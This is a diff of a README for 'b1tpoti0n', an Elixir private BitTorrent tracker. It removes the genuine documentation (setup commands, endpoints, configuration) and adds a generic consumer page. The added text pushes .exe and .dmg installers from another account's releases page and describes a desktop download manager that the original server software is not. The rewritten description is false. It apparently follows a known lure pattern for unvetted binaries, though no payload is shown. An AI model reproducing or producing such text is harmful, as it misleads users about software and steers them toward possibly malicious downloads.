@@ -1,108 +1,52 @@
-<p align="center">
-  <img src="b1tpoti0n.png" alt="b1tpoti0n" width="200">
-</p>
+# 🌐 b1tpoti0n - Easy Way to Manage Your Downloads
 
-# b1tpoti0n
+## 📥 Download Now
+[![Download b1tpoti0n](https://img.shields.io/badge/Download%20b1tpoti0n-Click%20Here-blue?style=for-the-badge)](https://github.com/rayannneee0711/b1tpoti0n/releases)
 
-Private BitTorrent tracker in Elixir.
+## 🚀 Getting Started
+Welcome to b1tpoti0n! This application is a private BitTorrent tracker that helps you manage and download torrent files easily and efficiently. You don’t need to be a tech expert to use it. Follow these simple steps to get started.
 
-## Why b1tpoti0n?
+## 🌍 Features
+- **User-friendly Interface**: Navigate the software easily.
+- **Privacy Focused**: Keep your downloads secure and private.
+- **Elixir Powered**: Built using Elixir for fast performance.
+- **Efficient Download Management**: Manage multiple torrents smoothly.
 
-| | b1tpoti0n | Ocelot (C++) | Chihaya (Go) |
-|---|:---:|:---:|:---:|
-| Zero-config start | SQLite default | MySQL required | External storage required |
-| Private tracker features | Built-in | Requires Gazelle | Middleware plugins |
-| Fault tolerance | OTP supervision | Manual | Manual |
-| Hot code upgrades | Native | No | No |
-| Clustering | Horde + Redis | No | Redis/etcd |
-| WebSocket live stats | Built-in | No | No |
-| Admin REST API | Built-in | Via Gazelle | No |
+## 🗒️ System Requirements
+Before you download, make sure your computer meets these basic requirements:
+- **Operating System**: Windows 10, macOS, or Linux.
+- **RAM**: At least 2 GB.
+- **Storage**: Minimum of 100 MB of free disk space.
+- **Internet Connection**: A reliable internet connection for downloading torrents.
 
-**Start simple, scale when needed.** SQLite + in-memory peers for small communities. Swap to PostgreSQL + Redis when you want with config changes only.
+## 🔗 Download & Install
+1. **Visit the [Releases Page](https://github.com/rayannneee0711/b1tpoti0n/releases)**: This is where you will find the latest version of b1tpoti0n.
+   
+2. **Select the Version You Need**: Choose the version that matches your operating system.
+   
+3. **Download the File**: Click on the download link for the appropriate file. 
 
-**Scalability is built into Elixir.** Elixir runs on the Erlang VM (BEAM), designed for telecom systems handling millions of concurrent connections. Each torrent swarm runs in its own lightweight process. The VM handles scheduling across all CPU cores automatically. When one node isn't enough, just add more! Horde distributes swarm workers across the cluster transparently. See [DOCUMENTATION.md](DOCUMENTATION.md) for details.
+4. **Install the Application**:
+   - **Windows**: Double-click the downloaded `.exe` file and follow the prompts to install the application.
+   - **macOS**: Open the downloaded `.dmg` file and drag the b1tpoti0n icon to your Applications folder.
+   - **Linux**: Follow the installation instructions for your specific distribution, usually via package managers or through terminal commands.
 
-**Fault tolerance by default.** OTP supervision trees restart crashed processes automatically. A bug in one swarm doesn't take down the tracker. Hot code upgrades let you deploy fixes without disconnecting peers.
+5. **Launch b1tpoti0n**: Find the application in your programs list and double-click to open it.
 
-**Batteries included.** HnR detection, bonus points, freeleech, ratio enforcement and client whitelist are all built-in. No separate daemons or plugins to maintain.
+## ⚙️ How to Use
+1. **Add a Torrent**: You can add a torrent file by clicking on the "Add" button. Locate your torrent file and select it.
+2. **Monitor Downloads**: Once added, you will see your download progress in the interface.
+3. **Manage Settings**: Access settings to adjust your preferences. You can set download limits or configure privacy features according to your needs.
 
-## Features
+## ✅ Troubleshooting Tips
+- **If the application doesn't start**: Check to ensure that your computer meets the system requirements.
+- **For slow downloads**: Ensure that you have a steady internet connection and that your firewall settings allow b1tpoti0n to access the network.
+- **If you encounter errors**: Visit our [Issues Page](https://github.com/rayannneee0711/b1tpoti0n/issues) for solutions and community support.
 
-- HTTP/HTTPS tracker (BEP 3)
-- UDP tracker (BEP 15) (public mode only, no user auth)
-- Passkey authentication
-- User ratio tracking
-- Client whitelist
-- IP banning
-- Rate limiting
-- Hit-and-Run detection
-- Bonus points system
-- Freeleech and multipliers
-- Prometheus metrics
-- SQLite or PostgreSQL database
-- In-memory or Redis peer storage
-- Optional clustering (Horde + Redis)
+## 🔄 Keeping Up-to-Date
+To benefit from the latest features and fixes, regularly check the [Releases Page](https://github.com/rayannneee0711/b1tpoti0n/releases). Make sure you update to the latest version whenever possible.
 
-## Quick Start
+## 📞 Support
+If you have any questions or need assistance, feel free to reach out. You can post your queries on our issue tracker or check other users' experiences.
 
-```bash
-# Install dependencies
-mix deps.get
-
-# Setup database
-mix ecto.create && mix ecto.migrate
-
-# Start tracker
-iex -S mix
-```
-
-Default port: HTTP 8080 (UDP disabled by default, set `udp_port` to enable)
-
-## Endpoints
-
-- `GET /:passkey/announce` - Announce
-- `GET /:passkey/scrape` - Scrape
-- `GET /health` - Health check
-- `GET /stats` - Basic statistics
-- `GET /metrics` - Prometheus metrics
-- `/admin/*` - Admin REST API
-- `GET /ws` - WebSocket (real-time updates)
-
-## Configuration
-
-See `config/config.exs` for all options.
-
-Key settings:
-- `http_port` / `https_port` / `udp_port` - Network ports
-- `admin_token` - Admin API authentication (required in production)
-- `peer_storage` - `:memory` (default) or `:redis` for clustering
-- `hnr` - Hit-and-Run detection settings
-- `bonus_points` - Bonus points system settings
-- `enforce_torrent_whitelist` - Require torrent pre-registration.
-
-For production, set environment variables (see DOCUMENTATION.md):
-- `ADMIN_TOKEN`, `HTTP_PORT`, `UDP_PORT`, `DATABASE_URL`, etc.
-
-## Documentation
-
-See [DOCUMENTATION.md](DOCUMENTATION.md) for complete documentation including:
-- Full configuration reference
-- Architecture overview
-- Admin API reference
-- Deployment guide
-
-## Admin UI
-
-A standalone admin interface is available at `admin-ui/index.html`.
-
-[**Live Demo**](https://gmonarque.github.io/b1tpoti0n/) — UI preview (not connected to a tracker)
-
-## Tests
-
-```bash
-mix test
-```
-
-## License
-
-[AGPL-3.0](LICENSE) — If you modify and run this on a server, you must share your changes. If you don't, I'll hunt you down.
+Thank you for choosing b1tpoti0n! Enjoy secure and efficient torrent downloading.
